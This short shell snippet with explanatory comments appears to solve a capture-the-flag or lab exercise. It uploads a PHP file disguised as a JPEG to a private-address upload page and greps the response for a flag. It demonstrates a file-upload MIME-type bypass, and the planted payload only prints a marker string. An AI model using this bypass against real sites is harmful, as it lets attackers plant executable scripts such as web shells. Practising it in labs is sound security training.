echo '<?php echo "LHAKER"; ?>' > /tmp/malicious.php &&
curl -X POST \
 -F "Upload=Upload" -F "uploaded=@/tmp/malicious.php;type=image/jpeg" \
 "http://10.12.100.90/?page=upload"\ | grep 'flag'

# -F sends data as multipart/form-data, mimicking a form submission.

# Upload=Upload suggests a form field named Upload with the value Upload

# uploaded= is the form field name for the file input (e.g., <input type="file" name="uploaded">).
# @/tmp/malicious.php instructs curl to upload the file /tmp/malicious.php.
# ;type=image/jpeg overrides the MIME type to image/jpeg, disguising the PHP file as an image.




